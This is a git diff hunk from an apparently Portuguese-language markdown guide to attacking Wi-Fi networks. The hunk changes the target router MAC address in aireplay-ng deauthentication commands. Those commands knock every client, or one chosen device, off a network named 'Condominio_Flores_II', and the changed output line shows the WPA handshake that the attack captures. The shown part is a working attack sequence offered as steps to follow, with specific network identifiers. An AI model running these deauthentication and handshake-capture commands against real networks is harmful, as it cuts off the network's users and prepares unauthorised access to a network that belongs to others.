@@ -109,19 +109,19 @@ sudo airodump-ng -w capturados --channel 2 --essid Condominio_Flores_II wlp0s20f
 ## Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):
 
 ```bash
-sudo aireplay-ng --deauth 0 -a 64:D1:54:09:EE:3E wlp0s20f3mon
+sudo aireplay-ng --deauth 0 -a 70:4F:57:70:B6:5A wlp0s20f3mon
 ```
 
 Posso tbém, desautenticar apenas um dispositivo específico
 
 ```bash
-sudo aireplay-ng --deauth 5 -a 64:D1:54:09:EE:3E -c 28:6C:07:6F:F9:53 wlp0s20f3mon
+sudo aireplay-ng --deauth 5 -a 70:4F:57:70:B6:5A -c 28:6C:07:6F:F9:53 wlp0s20f3mon
 ```
 
 ## Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:
 
 ```bash
-[WPA handshake]: 64:D1:54:09:EE:3E
+[WPA handshake]: 70:4F:57:70:B6:5A
 ```
 
 ## Podemos encerrar a captura no TERMINAL 01
